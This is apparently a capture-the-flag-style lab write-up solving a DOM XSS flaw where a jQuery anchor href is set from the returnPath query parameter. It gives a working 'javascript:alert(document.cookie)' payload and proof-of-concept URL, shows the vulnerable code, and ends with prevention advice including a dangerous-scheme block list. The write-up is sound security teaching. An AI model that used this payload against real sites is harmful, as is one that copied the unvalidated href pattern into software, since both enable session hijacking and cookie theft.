# Lab: DOM XSS in jQuery Anchor `href` Attribute Sink Using `location.search`



This lab contains a **DOM-based Cross-Site Scripting (DOM XSS)** vulnerability on the **Submit Feedback** page.

The application uses jQuery to locate an anchor (`<a>`) element and dynamically sets its `href` attribute using data taken from `location.search`.

Because user-controlled input is inserted into the `href` attribute without validation, an attacker can inject a `javascript:` URL and execute JavaScript when the link is clicked.

## Objective

Make the **Back** link execute:

```javascript
alert(document.cookie)
```

to solve the lab.

---

## Vulnerability Details

### Source

The vulnerable source is:

```javascript
location.search
```

This contains user-supplied data from the URL query string.

### Sink

The vulnerable sink is:

```javascript
$('a').attr('href', returnPath);
```

The value of `returnPath` is assigned directly to the anchor's `href` attribute without any sanitization.

---

## Solution

### Step 1: Open the Submit Feedback Page

Navigate to the **Submit Feedback** page.

### Step 2: Test the `returnPath` Parameter

Append a random string to the URL:

```url
?returnPath=/test123
```

Example:

```url
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=/test123
```

### Step 3: Inspect the Back Link

Right-click the **Back** link and select **Inspect**.

You will notice that your input has been inserted into the `href` attribute:

```html
<a href="/test123">Back</a>
```

This confirms that the application is using the `returnPath` parameter to construct the link.

### Step 4: Inject a JavaScript URI

Replace the value of `returnPath` with:

```javascript
javascript:alert(document.cookie)
```

Resulting URL:

```url
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

### Step 5: Execute the Payload

Press **Enter** to load the page.

Click the **Back** link.

The browser executes:

```javascript
alert(document.cookie)
```

The alert box appears displaying the cookie value, and the lab is successfully solved.

---

## Payload

```javascript
javascript:alert(document.cookie)
```

## Proof of Concept

```url
?returnPath=javascript:alert(document.cookie)
```

---

## Why the Attack Works

The application performs the following action:

```javascript
var returnPath = new URLSearchParams(location.search).get('returnPath');
$('a').attr('href', returnPath);
```

Since no validation is applied, an attacker can supply a `javascript:` URL instead of a normal path.

When the victim clicks the link, the browser interprets the value as executable JavaScript and runs it.

---

## Impact

* DOM-Based Cross-Site Scripting (DOM XSS)
* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft
* User impersonation
* Phishing attacks

---

## Prevention

### Validate URLs

Only allow safe protocols:

```javascript
http:
https:
```

### Block Dangerous Schemes

Reject values beginning with:

```javascript
javascript:
data:
vbscript:
```

### Use a Whitelist

Allow only predefined application paths:

```javascript
const allowedPaths = ['/','/home','/contact'];

if (allowedPaths.includes(returnPath)) {
    $('a').attr('href', returnPath);
}
```

### Implement CSP

Use a strict Content Security Policy to reduce XSS impact.

---

## Lab Status

✅ Solved
